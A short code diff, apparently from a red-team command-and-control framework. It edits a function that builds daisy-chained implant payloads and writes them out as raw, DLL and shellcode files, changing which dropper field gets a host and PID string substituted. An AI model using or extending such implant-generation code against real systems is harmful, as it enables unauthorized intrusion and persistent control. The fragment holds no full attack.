@@ -89,7 +89,7 @@ def createdaisypayload(user, startup):
   newPayload = Payloads(C2[5], C2[2], daisyurl, "", daisyport, "", "", "",
     "", proxynone, C2[19], C2[20],
     C2[21], "%s?d" % get_newimplanturl(), PayloadsDirectory)
-  newPayload.C2Core = (newPayload.C2Core).replace("$pid;%s" % (daisyurl+":"+daisyport),"$pid;%s@%s" % (daisyhost[11],daisyhost[3]))
+  newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl+":"+daisyport),"$pid;%s@%s" % (daisyhost[11],daisyhost[3]))
   newPayload.CreateRaw(name)
   newPayload.CreateDlls(name)
   newPayload.CreateShellcode(name)
